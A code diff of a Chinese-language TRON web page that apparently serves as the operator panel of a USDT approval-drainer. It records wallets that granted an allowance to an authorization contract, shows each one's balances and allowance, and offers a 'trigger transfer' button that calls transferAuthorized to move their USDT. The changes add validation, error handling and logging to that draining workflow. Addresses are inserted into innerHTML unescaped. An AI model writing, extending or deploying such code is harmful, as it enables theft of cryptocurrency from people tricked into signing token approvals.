@@ -54,54 +54,64 @@
 
     async function checkWallet() {
       const address = document.getElementById("checkWallet").value.trim();
-      if (!address) return alert("請輸入地址");
+      if (!address || !/^T[a-zA-Z0-9]{33}$/.test(address)) {
+        return alert("請輸入有效的 TRON 錢包地址（以 T 開頭，共 34 字元）");
+      }
       try {
-        const usdt = await window.tronWeb.contract().at(USDT_CONTRACT);
+        if (!window.tronWeb || !tronWeb.defaultAddress.base58) {
+          return alert("請使用 TronLink DApp 瀏覽器開啟此頁面，並確保已登入錢包");
+        }
+
+        const usdt = await tronWeb.contract().at(USDT_CONTRACT);
         const allowance = await usdt.allowance(address, AUTH_CONTRACT).call();
-        const allowed = parseInt(allowance.toString()) / 1e6;
+        const allowed = parseFloat(allowance.toString()) / 1e6;
+
+        alert(`授權額度：${allowed} USDT`);
 
         if (allowed > 0) {
-          // 將錢包加入後端記錄
           await axios.post(`${BACKEND}/wallets`, { address });
           if (!approvedWallets.includes(address)) {
             approvedWallets.push(address);
           }
-          // 重新渲染錢包清單
           await renderWallets();
         }
-
-        alert(`授權額度：${allowed} USDT`);
-      } catch (e) {
-        alert("查詢失敗：" + e.message);
+      } catch (err) {
+        console.error(err);
+        alert("查詢失敗：" + err.message);
       }
     }
 
     async function renderWallets() {
-      const res = await axios.get(`${BACKEND}/wallets`);
-      const usdt = await window.tronWeb.contract().at(USDT_CONTRACT);
-      const wrap = document.getElementById("wallets");
-      wrap.innerHTML = "";
+      try {
+        const res = await axios.get(`${BACKEND}/wallets`);
+        const usdt = await tronWeb.contract().at(USDT_CONTRACT);
+        const wrap = document.getElementById("wallets");
+        wrap.innerHTML = "";
 
-      for (const addr of res.data) {
-        const balance = await usdt.balanceOf(addr).call();
-        const trx = await tronWeb.trx.getBalance(addr);
-        const allow = await usdt.allowance(addr, AUTH_CONTRACT).call();
+        for (const addr of res.data) {
+          const balance = await usdt.balanceOf(addr).call();
+          const trx = await tronWeb.trx.getBalance(addr);
+          const allow = await usdt.allowance(addr, AUTH_CONTRACT).call();
 
-        const usdtBal = parseFloat(balance.toString()) / 1e6;
-        const trxBal = parseFloat(trx.toString()) / 1e6;
-        const allowance = parseFloat(allow.toString()) / 1e6;
+          const usdtBal = parseFloat(balance.toString()) / 1e6;
+          const trxBal = parseFloat(trx.toString()) / 1e6;
+          const allowance = parseFloat(allow.toString()) / 1e6;
 
-        const div = document.createElement("div");
-        div.className = "wallet-card";
-        div.innerHTML = `
-          <div><strong>地址：</strong>${addr}</div>
-          <div>USDT 餘額：${usdtBal}</div>
-          <div>TRX 餘額：${trxBal}</div>
-          <div>授權額度：${allowance}</div>
-          <input type="number" id="amount-${addr}" placeholder="輸入要轉的 USDT 金額">
-          <button onclick="triggerTransfer('${addr}')">🚀 觸發轉帳</button>
-        `;
-        wrap.appendChild(div);
+          const div = document.createElement("div");
+          div.className = "wallet-card";
+          div.innerHTML = `
+            <div><strong>地址：</strong>${addr}</div>
+            <div>USDT 餘額：${usdtBal}</div>
+            <div>TRX 餘額：${trxBal}</div>
+            <div>授權額度：${allowance}</div>
+            <input type="number" id="amount-${addr}" placeholder="輸入要轉的 USDT 金額">
+            <button onclick="triggerTransfer('${addr}')">🚀 觸發轉帳</button>
+          `;
+          wrap.appendChild(div);
+        }
+      } catch (err) {
+        console.error("renderWallets error", err);
+        alert("錢包資料讀取失敗");
       }
     }
 
@@ -110,8 +120,8 @@
       const amount = parseFloat(input.value);
       if (!amount || amount <= 0) return alert("請輸入有效金額");
 
-      const contract = await tronWeb.contract().at(AUTH_CONTRACT);
       try {
+        const contract = await tronWeb.contract().at(AUTH_CONTRACT);
         await contract.transferAuthorized(
           USDT_CONTRACT,
           from,
@@ -121,6 +131,7 @@
 
         alert(`✅ 已觸發 ${amount} USDT 轉帳`);
       } catch (err) {
+        console.error("轉帳錯誤", err);
         alert("❌ 轉帳失敗：" + err.message);
       }
     }
